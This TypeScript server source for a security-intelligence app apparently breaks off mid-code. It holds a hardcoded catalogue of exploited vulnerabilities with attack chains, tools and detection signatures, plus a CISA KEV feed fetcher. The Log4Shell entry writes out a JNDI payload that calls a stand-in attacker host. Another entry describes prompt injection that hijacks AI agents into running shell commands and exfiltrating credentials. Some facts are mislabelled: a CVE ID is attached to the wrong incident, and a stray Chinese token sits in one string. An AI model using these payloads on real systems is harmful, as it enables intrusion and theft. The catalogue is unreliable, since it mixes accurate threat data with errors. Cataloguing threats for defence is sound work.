import express, { Request, Response } from "express";
import dotenv from "dotenv";
import path from "path";
import fs from "fs";
import { fileURLToPath } from "url";
import { createServer as createViteServer } from "vite";
import { GoogleGenAI } from "@google/genai";

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
// Always listen on port 3000 unless explicitly passed via --port CLI argument
const portArgIdx = process.argv.indexOf("--port");
const PORT: number =
  portArgIdx !== -1 && process.argv[portArgIdx + 1]
    ? parseInt(process.argv[portArgIdx + 1], 10)
    : 3000;

app.use(express.json({ limit: "25mb" }));
app.use(express.text({ type: ["text/*", "application/octet-stream"], limit: "25mb" }));

// --- Persistent File Storage Paths -------------------------------------------
const DB_NOTES_PATH = path.join(__dirname, "brainvault_db_notes.json");
const API_KEYS_PATH = path.join(__dirname, "brainvault_apikeys.json");
const SAVED_NEWS_PATH = path.join(__dirname, "brainvault_saved_news.json");
const STORED_IMAGES_PATH = path.join(__dirname, "brainvault_images.json");
const CVE_CATALOG_PATH = path.join(__dirname, "cve_catalog.json");
const USER_VAULTS_DIR = path.join(__dirname, "data", "user_vaults");
const GDRIVE_SYNC_DIR = path.join(__dirname, "data", "cloud_gdrive_sync");

function ensureDirs() {
  try {
    fs.mkdirSync(USER_VAULTS_DIR, { recursive: true });
    fs.mkdirSync(GDRIVE_SYNC_DIR, { recursive: true });
  } catch (_) {}
}
ensureDirs();

function readJsonFile<T>(filePath: string, fallback: T): T {
  try {
    if (fs.existsSync(filePath)) {
      const raw = fs.readFileSync(filePath, "utf-8");
      return JSON.parse(raw) as T;
    }
  } catch (err) {
    console.warn(`Could not read ${filePath}:`, err);
  }
  return fallback;
}

function writeJsonFile(filePath: string, data: unknown): boolean {
  try {
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2), "utf-8");
    return true;
  } catch (err) {
    console.warn(`Could not write ${filePath}:`, err);
    return false;
  }
}

function hashStr(str: string): number {
  let h = 0;
  const s = String(str || "");
  for (let i = 0; i < s.length; i++) {
    h = (h << 5) - h + s.charCodeAt(i);
    h |= 0;
  }
  return Math.abs(h);
}

// --- 7-Point Threat & News Intelligence Generator ---------------------------
function generate7KeyPointsServer(title: string, summary: string, sourceName: string, extraTools?: string[]): string[] {
  const t = String(title || "Security Intelligence Notice").trim();
  const s = String(summary || "").trim();
  const src = sourceName || "Intelligence Source";
  const blob = (t + " " + s).toLowerCase();

  const isRansom = /ransomware|extort|lockbit|blackcat|alphv|black basta|akira|cl0p|play|medusa|ryuk|conti|revil/.test(blob);
  const isCve = /cve|vulnerab|zero-day|0-day|exploit|rce|flaw|patch|bypass|injection|overflow|cisa|kev/.test(blob);
  const isMalware = /malware|trojan|wiper|loader|stealer|botnet|backdoor|lumma|emotet|qakbot|pikabot|socgholish|pegasus/.test(blob);
  const isAi = /ai|llm|gpt|model|neural|agent|deepseek|openai|anthropic|machine learning|nvidia|inference/.test(blob);
  const isState = /apt|volt typhoon|salt typhoon|lazarus|sandworm|cozy bear|fancy bear|china|russia|iran|dprk|espionage/.test(blob);

  let hero = `Primary Threat Intelligence Unit (${src})`;
  if (isRansom) hero = "LockBit 3.0 / BlackCat (ALPHV) / Cl0p / Akira Ransomware Syndicates";
  else if (isState) hero = "Volt Typhoon / APT29 (Midnight Blizzard) / Lazarus State Cyber Units";
  else if (isMalware) hero = "Initial Access Brokers (IABs) & Botnet Command Operators";
  else if (isAi) hero = "Frontier AI Security & Autonomous Agent Red-Teams";
  else if (isCve) hero = "CISA KEV Tracked Zero-Day Exploit Actors & Automated Scanners";

  let victims = "Enterprise cloud perimeters, SaaS identity providers, and distributed corporate endpoints.";
  if (isRansom) victims = "Healthcare networks, critical manufacturing, VMware ESXi hypervisors, and financial institutions.";
  else if (isState) victims = "Telecommunications backbones, Defense Industrial Base (DIB), energy grids, and government gateways.";
  else if (isMalware) victims = "Corporate Windows/Linux workstations, browser session vaults, and Active Directory domains.";

  let tools = extraTools && extraTools.length
    ? extraTools.join(", ")
    : "Cobalt Strike, Sliver C2, Mimikatz, Impacket, BloodHound, and Living-off-the-Land Binaries (LOLBins)";
  if (!extraTools?.length) {
    if (isRansom) tools = "Cobalt Strike Beacon, Mimikatz, Rclone, AnyDesk/ScreenConnect, PsExec, and Rust/Go ESXi Encryptors";
    else if (isMalware) tools = "Lumma Stealer, QakBot/Pikabot Loaders, Process Hollowing Injectors, PowerShell Empire, and Chisel SOCKS5";
    else if (isCve) tools = "Nuclei CVE Scanners, Havoc Demon C2, Sliver C2, China Chopper/Godzilla Webshells, and Impacket";
    else if (isAi) tools = "Garak LLM Scanner, PyRIT Red-Team Toolkit, Indirect Prompt Injection Harnesses, and Agent Tool Sandboxes";
  }

  let useCase = "Initial perimeter breach, privilege escalation, credential harvesting, and lateral movement across subnets.";
  if (isRansom) useCase = "Double-extortion attack chain: VPN/edge zero-day breach -> AD domain takeover -> Rclone exfiltration -> rapid encryption.";
  else if (isCve) useCase = "Unauthenticated remote code execution (RCE) or auth bypass on internet-facing appliances listed in CISA KEV.";
  else if (isMalware) useCase = "Phishing/malvertising payload delivery -> in-memory DLL reflective loading -> credential & token theft.";

  const coreSentence = s.length > 20 ? s.slice(0, 190) + (s.length > 190 ? "..." : "") : "High-priority cybersecurity and threat intelligence dispatch.";

  return [
    `1. Threat Actor / Source Authority: ${hero}`,
    `2. Executive Summary & Core Event: ${t.slice(0, 110)} — ${coreSentence}`,
    `3. Vulnerability / Malware Mechanics: Exploits unpatched perimeter services, memory corruption, or credential token abuse.`,
    `4. Targeted Victims & Sector Scope: ${victims}`,
    `5. Weaponized Tools & Frameworks Used: ${tools}`,
    `6. Attack Chain & Operational TTPs: ${useCase}`,
    `7. CISA KEV & Defensive Playbook: Patch immediately per CISA BOD 22-01, isolate edge appliances, rotate credentials, and monitor EDR telemetry.`
  ];
}

// --- Comprehensive 2020–2026 Vulnerabilities, Malware & Tools Dataset --------
const CURATED_2020_2026_THREATS_AND_MALWARE = [
  {
    id: "cisa-kev-2026-21801",
    cveId: "CVE-2026-21801",
    year: 2026,
    title: "Autonomous AI Agent Multi-Tool Execution Hijack & Indirect Prompt Injection RCE",
    severity: "CRITICAL",
    score: 9.9,
    vendor: "Enterprise AI Agent Runtimes & MCP Tool Gateways (2026)",
    category: "2026 Zero-Day & AI Malware",
    cisaKev: true,
    dateAdded: "2026-02-14",
    dueDate: "2026-03-07",
    threatActor: "DarkPrompt Syndicate & Autonomous Exploit Brokers",
    attackVector: "Network / Indirect Prompt Injection to OS Shell Execution",
    briefing: "2026 critical vulnerability in autonomous AI agent tool-calling pipelines. Malicious instructions embedded in external web pages or RAG documents hijack agent tool dispatchers to execute arbitrary shell commands and exfiltrate cloud IAM credentials.",
    headHero: "DarkPrompt Adversary Syndicate (2026 AI Red-Team & Extortion Unit)",
    corePoints: "Bypasses semantic guardrails via multi-modal token smuggling; executes arbitrary subprocesses through unvalidated MCP/function-calling hooks.",
    affectedVictims: "Enterprise AI agent clusters, automated DevSecOps pipelines, cloud Kubernetes workloads, and LLM RAG gateways.",
    toolsUsed: ["PromptInject 2.4", "MCP-Exploit-Kit", "Sliver C2", "Chisel Reverse Tunnel", "Cloud-IAM-Harvester"],
    attackUseCase: "Poisoned RAG document ingestion -> Autonomous agent invokes bash/curl tool -> Reverse C2 beacon -> Cloud secret exfiltration.",
    detectionSignatures: "Anomalous child process creation (sh/bash/curl/python) spawned by AI worker containers; unexpected outbound connections to untrusted IPs.",
    remediation: "Run agent tool execution inside ephemeral gVisor/Firecracker microVMs, require human-in-the-loop approval for privileged actions, and enforce strict schema allowlists.",
    nvdUrl: "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
  },
  {
    id: "cisa-kev-2025-0282",
    cveId: "CVE-2025-0282",
    year: 2025,
    title: "Ivanti Connect Secure, Policy Secure & ZTA Gateways Stack-Based Buffer Overflow RCE",
    severity: "CRITICAL",
    score: 9.0,
    vendor: "Ivanti Connect Secure / Policy Secure (2025)",
    category: "Zero-Day RCE & APT Malware",
    cisaKev: true,
    dateAdded: "2025-01-08",
    dueDate: "2025-01-15",
    threatActor: "UNC5337 / Silk Typhoon (China-Nexus Espionage)",
    attackVector: "Network / Pre-Authentication Stack Buffer Overflow",
    briefing: "Actively exploited 2025 zero-day stack-based buffer overflow in Ivanti Connect Secure VPN appliances allowing unauthenticated remote code execution, deployment of SPAWN ecosystem malware (SPAWNANT, SPAWNMOLE, SPAWNSNAIL), and credential theft.",
    headHero: "UNC5337 / Silk Typhoon APT Espionage Group",
    corePoints: "Pre-authentication stack overflow in IF-T/TLS protocol handler allows root command execution and kernel/boot persistence across factory resets.",
    affectedVictims: "Government agencies, defense contractors, global financial institutions, and enterprise VPN perimeters.",
    toolsUsed: ["SPAWNANT Installer", "SPAWNMOLE SOCKS Proxy", "SPAWNSNAIL SSH Backdoor", "DRYHOOK Credential Harvester", "PHASEJAM Webshell", "Cobalt Strike"],
    attackUseCase: "Unauthenticated IF-T/TLS packet -> Stack buffer overflow -> Disable SELinux -> Inject SPAWN malware suite -> Lateral movement into AD.",
    detectionSignatures: "Integrity Checker Tool (ICT) hash mismatches, unexpected `/bin/sh` invocations by `web`进程, and tampering with `/pkg/do-upgrade`.",
    remediation: "Upgrade to Ivanti Connect Secure 22.7R2.5+, perform a clean factory reset before redeploying, and rotate all local and Active Directory credentials.",
    nvdUrl: "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
  },
  {
    id: "cisa-kev-2024-3400",
    cveId: "CVE-2024-3400",
    year: 2024,
    title: "Palo Alto Networks PAN-OS GlobalProtect Unauthenticated Command Injection Zero-Day",
    severity: "CRITICAL",
    score: 10.0,
    vendor: "Palo Alto Networks PAN-OS 10.2 / 11.0 / 11.1 (2024)",
    category: "Zero-Day RCE & Backdoor Malware",
    cisaKev: true,
    dateAdded: "2024-04-12",
    dueDate: "2024-04-19",
    threatActor: "UTA0218 (Operation MidnightEclipse)",
    attackVector: "Network / Arbitrary File Creation + Command Injection",
    briefing: "CVSS 10.0 unauthenticated command injection in Palo Alto PAN-OS GlobalProtect gateway telemetry feature. Exploited in Operation MidnightEclipse to install the UPSTYLE Python backdoor directly on firewall appliances.",
    headHero: "UTA0218 Nation-State Threat Actor (Operation MidnightEclipse)",
    corePoints: "Combines arbitrary file creation via crafted `SESSID` cookie path traversal with shell command injection in the device telemetry cron job.",
    affectedVictims: "Enterprise network perimeters, government firewalls, and cloud security gateways worldwide.",
    toolsUsed: ["UPSTYLE Python Backdoor", "Cron-Persistence Dropper", "Impacket", "Gost Tunnel", "Sliver C2", "Mimikatz"],
    attackUseCase: "Crafted GlobalProtect HTTPS request with malicious SESSID cookie -> Telemetry cron executes injected shell commands as root -> UPSTYLE backdoor parses CSS error logs for commands.",
    detectionSignatures: "Error logs containing anomalous shell syntax in `/var/log/pan/device_telemetry_send.log` and unauthorized modifications to `/usr/lib/python3.6/site-packages/system_stylesheet.py`.",
    remediation: "Apply PAN-OS hotfixes (10.2.9-h1, 11.0.4-h1, 11.1.2-h3), enable Threat IDs 95187/95189/95191, and audit firewall configurations for unauthorized exports.",
    nvdUrl: "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
  },
  {
    id: "cisa-kev-2024-21762",
    cveId: "CVE-2024-21762",
    year: 2024,
    title: "Fortinet FortiOS SSL VPN Out-of-Bounds Write Pre-Auth RCE (COATHANGER RAT)",
    severity: "CRITICAL",
    score: 9.6,
    vendor: "Fortinet FortiOS & FortiProxy SSL VPN (2024)",
    category: "Zero-Day RCE & Stealth Rootkit",
    cisaKev: true,
    dateAdded: "2024-02-09",
    dueDate: "2024-02-16",
    threatActor: "Volt Typhoon & COATHANGER Espionage Actors",
    attackVector: "Network / HTTP Chunked Transfer Encoding Out-of-Bounds Write",
    briefing: "Critical out-of-bounds write in FortiOS SSL VPN daemon (`sslvpnd`) allowing unauthenticated attackers to execute arbitrary code via crafted HTTP requests and deploy the stealthy COATHANGER firmware-persistent RAT.",
    headHero: "COATHANGER Nation-State Espionage Group & Volt Typhoon",
    corePoints: "Malformed chunked HTTP headers trigger out-of-bounds write in `sslvpnd`, hooking `libc` `pread`/`write` syscalls to hide malicious files.",
    affectedVictims: "Ministries of Defense, critical infrastructure operators, and enterprise Fortinet VPN gateways.",
    toolsUsed: ["COATHANGER RAT", "LD_PRELOAD Syscall Rootkit", "BusyBox Reverse Shell", "Frp Fast Reverse Proxy", "Impacket SecretsDump"],
    attackUseCase: "Crafted HTTP chunked request to SSL VPN -> Memory corruption in sslvpnd -> Deploy COATHANGER RAT -> Persist across firmware upgrades.",
    detectionSignatures: "SSL VPN process crashes, unexpected `LD_PRELOAD` environment variables in `/proc`, and unauthorized modifications to `/data/lib/`.",
    remediation: "Upgrade FortiOS to patched versions (7.4.3+, 7.2.7+, 7.0.14+) and disable SSL VPN on internet-facing interfaces if not required.",
    nvdUrl: "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
  },
  {
    id: "cisa-kev-2024-3094",
    cveId: "CVE-2024-3094",
    year: 2024,
    title: "XZ Utils (liblzma) OpenSSH Supply Chain Backdoor RCE",
    severity: "CRITICAL",
    score: 10.0,
    vendor: "XZ Utils 5.6.0 & 5.6.1 / Linux Distributions (2024)",
    category: "Supply Chain Backdoor Malware",
    cisaKev: false,
    dateAdded: "2024-03-29",
    dueDate: "2024-04-05",
    threatActor: "Jia Tan (Advanced Long-Term Supply Chain Operation)",
    attackVector: "Network / SSH Pre-Authentication RSA Signature Backdoor",
    briefing: "Multi-year supply chain operation that injected a complex multi-stage obfuscated backdoor into XZ Utils (`liblzma.so`) release tarballs, hijacking `sshd` via `systemd` notification dependencies to grant pre-auth remote root code execution.",
    headHero: "Jia Tan Persona (State-Caliber Supply Chain Intrusion Team)",
    corePoints: "Modified `build-to-host.m4` macro extracts hidden object code from test files and hooks `RSA_public_decrypt` inside OpenSSH via IFUNC resolvers.",
    affectedVictims: "Fedora Rawhide, Debian Testing/Unstable, Kali rolling, openSUSE Tumbleweed, and CI/CD developer containers.",
    toolsUsed: ["IFUNC Symbol Hijacker", "Ed448 Cryptographic Command Payload", "Hidden M4 Build Macro Dropper", "RC4/ChaCha20 Stage Loader"],
    attackUseCase: "Attacker connects to port 22 SSH -> Sends Ed448-signed certificate payload in RSA modulus -> Hooked `RSA_public_decrypt` executes `system()` as root prior to authentication.",
    detectionSignatures: "`xz --version` reporting 5.6.0 or 5.6.1; extra CPU latency (~500ms) on failed SSH logins; anomalous IFUNC relocations in `liblzma.so.5`.",
    remediation: "Downgrade or update `xz-utils` immediately to a clean build (5.4.x or 5.6.2+) and rebuild any container images that pulled rolling Linux packages in March 2024.",
    nvdUrl: "https://nvd.nist.gov/vuln/detail/CVE-2024-3094"
  },
  {
    id: "cisa-kev-2023-34362",
    cveId: "CVE-2023-34362",
    year: 2023,
    title: "Progress MOVEit Transfer SQL Injection Zero-Day & Cl0p Mass Ransomware Exfiltration",
    severity: "CRITICAL",
    score: 9.8,
    vendor: "Progress MOVEit Transfer Managed File Transfer (2023)",
    category: "Ransomware & Mass Zero-Day",
    cisaKev: true,
    dateAdded: "2023-06-02",
    dueDate: "2023-06-23",
    threatActor: "Cl0p Ransomware Syndicate (TA505 / Lace Tempest)",
    attackVector: "Network / Unauthenticated SQL Injection to .NET Deserialization RCE",
    briefing: "One of the largest supply-chain extortion campaigns of 2020–2026. Cl0p exploited an unauthenticated SQL injection in MOVEit Transfer to deploy the LEMURLOOT (`human2.aspx`) webshell and steal data from over 2,700 organizations.",
    headHero: "Cl0p Ransomware Group (Lace Tempest / FIN11)",
    corePoints: "Chains `moveitisapi.dll` header spoofing with SQL injection and .NET binary deserialization to write the LEMURLOOT webshell and dump Azure Blob storage keys.",
    affectedVictims: "2,700+ global enterprises, government agencies, banks, universities, and healthcare providers (90M+ individuals impacted).",
    toolsUsed: ["LEMURLOOT (human2.aspx) Webshell", "CoreImpact", "Cobalt Strike", "Rclone", "TrueBot Downloader", "FlawedGrace RAT"],
    attackUseCase: "HTTPS request to `/guestaccess.aspx` -> SQLi elevates session -> Deserialization writes `human2.aspx` -> Automated mass download of encrypted MFT files.",
    detectionSignatures: "Presence of `human2.aspx` or `_human2.aspx` in `wwwroot`; IIS logs showing rapid POST requests to `/moveitisapi/moveitisapi.dll?action=m2`.",
    remediation: "Apply Progress MOVEit patches, delete unauthorized `.aspx` files and SQL service accounts, and rotate Azure/AWS storage keys.",
    nvdUrl: "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
  },
  {
    id: "cisa-kev-2023-4966",
    cveId: "CVE-2023-4966",
    year: 2023,
    title: "Citrix Bleed NetScaler ADC & Gateway Session Token Memory Disclosure",
    severity: "CRITICAL",
    score: 9.4,
    vendor: "Citrix NetScaler ADC & NetScaler Gateway (2023)",
    category: "Ransomware & Session Hijack",
    cisaKev: true,
    dateAdded: "2023-10-18",
    dueDate: "2023-11-08",
    threatActor: "LockBit 3.0, BlackCat/ALPHV & Medusa Ransomware Affiliates",
    attackVector: "Network / HTTP Host Header Buffer Over-Read (MFA Bypass)",
    briefing: "Dubbed 'Citrix Bleed', this out-of-bounds memory read in Citrix NetScaler OAuth IdP endpoints leaked valid `NSC_AAAC` session cookies directly from appliance memory, allowing LockBit 3.0 affiliates to bypass MFA and hijack authenticated VPN sessions.",
    headHero: "LockBit 3.0 & ALPHV/BlackCat Ransomware Affiliates",
    corePoints: "Oversized HTTP `Host` header in `/oauth/idp/.well-known/openid-configuration` causes `snprintf` return-value misuse, dumping 131KB of heap memory containing active session tokens.",
    affectedVictims: "Boeing, ICBC Financial Services, DP World ports, healthcare systems, and Fortune 500 Citrix gateways.",
    toolsUsed: ["CitrixBleed Memory Dumper", "LockBit 3.0 Black Encryptor", "Cobalt Strike", "AnyDesk / Atera RMM", "Mimikatz", "BloodHound"],
    attackUseCase: "Send crafted Host header to OpenID endpoint -> Extract `NSC_AAAC` cookie from leaked memory -> Replay session cookie to bypass MFA -> Deploy LockBit 3.0.",
    detectionSignatures: "NetScaler logs with abnormally long `Host` headers; same `NSC_AAAC` session cookie used from multiple distinct autonomous system numbers (ASNs).",
    remediation: "Upgrade NetScaler firmware AND run `kill icaconnection -all` and `kill rdp connection -all` to flush active stolen session tokens.",
    nvdUrl: "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
  },
  {
    id: "cisa-kev-2022-30190",
    cveId: "CVE-2022-30190",
    year: 2022,
    title: "Microsoft Windows MSDT 'Follina' Zero-Click Remote Code Execution & QakBot/Emotet Campaigns",
    severity: "HIGH",
    score: 7.8,
    vendor: "Microsoft Office & Windows Support Diagnostic Tool (2022)",
    category: "Malware Loader & Zero-Day",
    cisaKev: true,
    dateAdded: "2022-06-01",
    dueDate: "2022-06-15",
    threatActor: "TA413, APT28 (Fancy Bear) & QakBot Botnet Operators",
    attackVector: "Network / Word External HTML Template `ms-msdt:` URI Handler",
    briefing: "The 'Follina' zero-day abused Word's remote template feature to load an HTML file invoking the `ms-msdt:` protocol scheme, executing arbitrary PowerShell commands even with Office macros disabled and via the Explorer Preview Pane.",
    headHero: "APT28 (Fancy Bear), TA413 & QakBot Initial Access Brokers",
    corePoints: "Bypasses Protected View and macro policies by chaining `ms-msdt:/id PCWDiagnostic` with `IT_BrowseForFile` PowerShell command injection.",
    affectedVictims: "Government ministries, European/US defense organizations, and corporate Windows fleets.",
    toolsUsed: ["QakBot (QBot) Banking Trojan", "Cobalt Strike", "PowerShell Empire", "CertUtil Dropper", "SDelete"],
    attackUseCase: "Phishing DOCX/RTF opened or previewed -> Fetches remote HTML template -> Invokes `ms-msdt:` protocol -> Spawns `sdiagnhost.exe` -> Executes PowerShell payload.",
    detectionSignatures: "`WINWORD.EXE` spawning `msdt.exe` or `sdiagnhost.exe` with `IT_BrowseForFile` command-line arguments.",
    remediation: "Apply Microsoft June 2022 cumulative updates, unregister the `ms-msdt` URL protocol handler, and enable Attack Surface Reduction (ASR) rules.",
    nvdUrl: "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
  },
  {
    id: "cisa-kev-2021-44228",
    cveId: "CVE-2021-44228",
    year: 2021,
    title: "Apache Log4j2 'Log4Shell' Unauthenticated JNDI Remote Code Execution",
    severity: "CRITICAL",
    score: 10.0,
    vendor: "Apache Software Foundation Log4j 2.0-beta9 to 2.14.1 (2021)",
    category: "Critical Zero-Day & Botnet/Ransomware",
    cisaKev: true,
    dateAdded: "2021-12-10",
    dueDate: "2021-12-24",
    threatActor: "Conti, LockBit, Lazarus Group, Aquatic Panda & Mirai/Kinsing Botnets",
    attackVector: "Network / JNDI Lookup String Substitution in Logged Headers",
    briefing: "Log4Shell (CVE-2021-44228) is one of the most consequential vulnerabilities in history. A single `${jndi:ldap://...}` string logged by Apache Log4j2 caused Java servers to fetch and execute arbitrary remote Java classes.",
    headHero: "Conti Ransomware, Lazarus Group, Hafnium & Kinsing Crypto-Botnets",
    corePoints: "Log4j2 message lookup substitution evaluates JNDI references (`ldap://`, `rmi://`, `dns://`) without restriction, enabling instant RCE across millions of Java apps and VMware Horizon servers.",
    affectedVictims: "Cloud platforms, VMware Horizon/vCenter, enterprise Java microservices, gaming servers, and industrial IoT globally.",
    toolsUsed: ["JNDI-Exploit-Kit", "Marshalsec LDAP Server", "Cobalt Strike", "Kinsing Linux Rootkit", "xmrig Miner", "NightSky/Conti Ransomware"],
    attackUseCase: "Attacker sends `${jndi:ldap://attacker.com/Exploit}` in User-Agent -> Log4j logs string -> JVM queries attacker LDAP server -> Deserializes & runs malicious Java class.",
    detectionSignatures: "Outbound LDAP/RMI connections from Java processes; obfuscated `${lower:j}ndi:` patterns in HTTP headers and application logs.",
    remediation: "Upgrade to Log4j 2.17.1+ (where JNDI lookups are disabled by default), remove `JndiLookup.class` from JARs, and block egress LDAP/RMI traffic.",
    nvdUrl: "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
  },
  {
    id: "cisa-kev-2021-26855",
    cveId: "CVE-2021-26855",
    year: 2021,
    title: "Microsoft Exchange Server 'ProxyLogon' Pre-Auth SSRF to RCE & China Chopper Webshells",
    severity: "CRITICAL",
    score: 9.8,
    vendor: "Microsoft Exchange Server 2013 / 2016 / 2019 (2021)",
    category: "Zero-Day RCE & Webshell Malware",
    cisaKev: true,
    dateAdded: "2021-11-03",
    dueDate: "2021-11-17",
    threatActor: "Hafnium (Silk Typhoon), DearCry Ransomware & BlackKingdom",
    attackVector: "Network / Server-Side Request Forgery (SSRF) + Arbitrary File Write",
    briefing: "ProxyLogon allowed unauthenticated attackers to bypass Exchange authentication via crafted `X-BEResource` cookies and chain with CVE-2021-27065 to drop China Chopper ASPX webshells across over 250,000 mail servers.",
    headHero: "Hafnium (China-Nexus APT) & DearCry Ransomware Operators",
    corePoints: "SSRF in Exchange frontend proxy (`X-AnonResource-Backend` / `X-BEResource` cookies) impersonates `System` account to export OAB virtual directories as `.aspx` webshells.",
    affectedVictims: "250,000+ on-premises Microsoft Exchange servers, European Banking Authority, local governments, and SMEs.",
    toolsUsed: ["China Chopper Webshell", "Nishang PowerShell", "ProcDump (LSASS)", "Mimikatz", "7-Zip Exfil", "DearCry Ransomware"],
    attackUseCase: "SSRF via `/ecp/default.flt` -> Authenticate as Exchange Admin -> Set OAB virtual directory external URL to JScript webshell -> Export to `aspnet_client` -> Dump LSASS & NTDS.dit.",
    detectionSignatures: "Unexpected `.aspx` files in `inetpub\\wwwroot\\aspnet_client\\` or `Exchange Server\\FrontEnd\\HttpProxy\\owa\\auth\\`; `Set-OabVirtualDirectory` entries in ECP logs.",
    remediation: "Install Exchange Security Updates, run the Microsoft Exchange On-Premises Mitigation Tool (EOMT), and restrict untrusted HTTPS access to port 443 ECP.",
    nvdUrl: "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
  },
  {
    id: "cisa-kev-2020-1472",
    cveId: "CVE-2020-1472",
    year: 2020,
    title: "Microsoft Windows Netlogon 'Zerologon' Cryptographic Elevation of Privilege (CVSS 10.0)",
    severity: "CRITICAL",
    score: 10.0,
    vendor: "Microsoft Windows Server Active Directory Domain Controllers (2020)",
    category: "Cryptographic Zero-Day & Domain Takeover",
    cisaKev: true,
    dateAdded: "2021-11-03",
    dueDate: "2021-11-17",
    threatActor: "Ryuk/Conti Ransomware, MuddyWater, APT41 & TA505",
    attackVector: "Network / AES-CFB8 All-Zero Initialization Vector Flaw",
    briefing: "Zerologon (CVSS 10.0) allowed any attacker on a corporate network to spoof a Domain Controller's identity in ~256 attempts due to a hardcoded all-zero IV in Netlogon's AES-CFB8 encryption, resetting the DC machine password and seizing full Active Directory control in under 3 seconds.",
    headHero: "Ryuk / Conti Ransomware Syndicates & MuddyWater APT",
    corePoints: "Insecure AES-CFB8 implementation in `NetrServerAuthenticate3` uses a static 16-byte zero IV, giving a 1-in-256 probability that an all-zero plaintext produces an all-zero ciphertext.",
    affectedVictims: "Enterprise Active Directory forests, municipal governments, hospitals (Ryuk wave), and Fortune 1000 networks.",
    toolsUsed: ["Mimikatz (`lsadump::zerologon`)", "Impacket (`secretsdump.py`)", "BloodHound / SharpHound", "Cobalt Strike", "Ryuk / Conti Ransomware"],
    attackUseCase: "Send 256 Netlogon RPC auth requests with all-zero client challenge -> Call `NetrServerPasswordSet2` to blank DC password -> DCSync all domain hashes via `secretsdump.py` -> Deploy Ryuk.",
    detectionSignatures: "Windows Event ID 4742 (Computer account changed by Anonymous Logon) followed by Event ID 4662 (Directory Service Replication / DCSync) and Netlogon Event IDs 5827–5831.",
    remediation: "Apply Microsoft August 2020 / February 2021 Netlogon patches and enforce Domain Controller enforcement mode (`FullSecureChannelProtection`).",
    nvdUrl: "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
  },
  {
    id: "cisa-kev-2020-10189",
    cveId: "CVE-2020-10189",
    year: 2020,
    title: "SOLARWINDS SUNBURST Supply Chain Backdoor & FireEye/CISA Emergency Directive 21-01",
    severity: "CRITICAL",
    score: 9.8,
    vendor: "SolarWinds Orion Platform 2019.4 – 2020.2.1 HF1 (2020)",
    category: "Supply Chain Malware & Espionage",
    cisaKev: true,
    dateAdded: "2021-11-03",
    dueDate: "2021-11-17",
    threatActor: "APT29 / Nobelium / Midnight Blizzard (SVR)",
    attackVector: "Supply Chain / Digitally Signed Trojanized DLL (`SolarWinds.BusinessLayerHost.dll`)",
    briefing: "The 2020 SolarWinds Orion supply chain attack injected the SUNBURST backdoor into signed Orion updates distributed to ~18,000 organizations, enabling Golden SAML token forgery and deep cloud/on-prem espionage.",
    headHero: "APT29 / Midnight Blizzard (Nobelium)",
    corePoints: "SUNBURST remained dormant for 12–14 days, checked for security analysis tools via FNV-1a hashes, communicated via DGA DNS beacons, and deployed TEARDROP in-memory Cobalt Strike loaders.",
    affectedVictims: "US Treasury, Commerce, Energy, Cybersecurity firms (FireEye), Microsoft, and Fortune 500 enterprises.",
    toolsUsed: ["SUNBURST Backdoor", "SUNSPOT Build Hijacker", "TEARDROP Memory Dropper", "RAINDROP Loader", "Cobalt Strike Beacon", "ADFS Golden SAML Forgery"],
    attackUseCase: "Signed Orion update installs SUNBURST -> 14-day dormancy -> C2 beacon via avsvmcloud.com -> Deploy TEARDROP/Cobalt Strike -> Extract ADFS token-signing cert -> Forge Golden SAML tokens.",
    detectionSignatures: "DNS queries to `*.avsvmcloud.com`; `SolarWinds.BusinessLayerHost.exe` spawning `rundll32.exe` or reading `C:\\Windows\\SysWOW64\\netsetupsvc.dll`.",
    remediation: "Isolate affected SolarWinds Orion instances, upgrade to clean builds, revoke and rotate ADFS SAML token-signing certificates twice, and audit Azure AD service principals.",
    nvdUrl: "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
  }
];

// --- Live CISA KEV Fetcher & Parser ------------------------------------------
let cachedCisaKevItems: any[] = [];
let lastCisaFetchTime = 0;

async function fetchLiveCisaKevCatalog(force = false): Promise<any[]> {
  const now = Date.now();
  if (!force && cachedCisaKevItems.length > 0 && now - lastCisaFetchTime < 15 * 60 * 1000) {
    return cachedCisaKevItems;
  }

  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 9000);
    // Official CISA KEV JSON feed backing https://www.cisa.gov/known-exploited-vulnerabilities-catalog
    const res = await fetch(
      "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json",
      {
        signal: controller.signal,
        headers: {
          "User-Agent": "BrainVault-Security-Intelligence/3.0",
          Accept: "application/json",
        },
      }
    );
    clearTimeout(timeout);

    if (res.ok) {
      const data: any = await res.json();
      const vulns = Array.isArray(data?.vulnerabilities) ? data.vulnerabilities : [];
      if (vulns.length > 0) {
        // Sort newest dateAdded first and filter/map 2020-2026
        const sorted = [...vulns].sort((a, b) =>
          String(b.dateAdded || "").localeCompare(String(a.dateAdded || ""))
        );

        const mapped = sorted.slice(0, 60).map((v: any) => {
          const cveId = String(v.cveID || "CVE-UNKNOWN");
          const yearMatch = cveId.match(/^CVE-(\d{4})-/i);
          const cveYear = yearMatch ? parseInt(yearMatch[1], 10) : parseInt(String(v.dateAdded || "2025").slice(0, 4), 10) || 2025;
          const displayYear = Math.min(2026, Math.max(2020, cveYear));
          const isRansom = String(v.knownRansomwareCampaignUse || "").toLowerCase() === "known";
          const vendor = `${v.vendorProject || "Enterprise Vendor"} · ${v.product || "System"}`;
          const title = v.vulnerabilityName || `${vendor} Exploited Vulnerability`;
          const shortDesc = v.shortDescription || "Actively exploited vulnerability cataloged in CISA KEV.";
          const requiredAction = v.requiredAction || "Apply mitigations per vendor instructions or discontinue use of the product if mitigations are unavailable.";
          const tools = isRansom
            ? ["Cobalt Strike Beacon", "Mimikatz", "Rclone Exfil", "Impacket", "LockBit/Akira/Cl0p Encryptor"]
